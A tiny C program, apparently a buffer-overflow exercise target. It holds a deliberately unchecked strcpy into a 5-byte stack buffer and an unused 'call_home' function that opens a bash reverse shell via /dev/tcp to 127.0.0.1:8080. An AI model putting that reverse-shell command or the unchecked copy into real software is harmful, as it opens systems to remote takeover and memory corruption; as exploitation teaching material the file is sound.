#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void call_home()
{
    printf("%s\n", "Bad Times");
    system("/bin/bash -c \"/bin/bash -i > /dev/tcp/127.0.0.1/8080 0<&1 2>&1 \"");
}

void bof(char *str)
{
    char buffer[5];
    strcpy(buffer, str);
}

void main(int argc, char *argv[])
{
    //call_home();
    bof(argv[1]);
    printf("%s\n", "Happy Days!\n");
}